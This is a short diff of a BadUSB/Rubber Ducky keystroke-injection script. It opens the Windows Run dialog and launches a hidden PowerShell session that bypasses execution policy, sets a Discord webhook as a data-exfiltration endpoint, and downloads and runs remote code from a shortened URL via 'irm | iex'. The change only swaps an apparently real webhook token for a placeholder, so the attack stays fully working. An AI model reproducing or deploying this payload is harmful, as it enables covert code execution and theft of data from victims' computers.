@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep -c $env:DISCORD_WEBHOOK_URL='https://discord.com/api/webhooks/1387040824285466755/GkvYrnfPzcd5lR9mXdFfXuRpGgyX_HrOjoDtPXgp7l5KUQ2_kJ-cAZYyEI5CBY08teMz';$db='';irm https://bit.ly/3T6HyqE | iex
+STRING powershell -w h -NoP -Ep -c $env:DISCORD_WEBHOOK_URL='https://discord.com/api/webhooks/YOURWEBHOOKHERE';$db='';irm https://bit.ly/3T6HyqE | iex
 ENTER
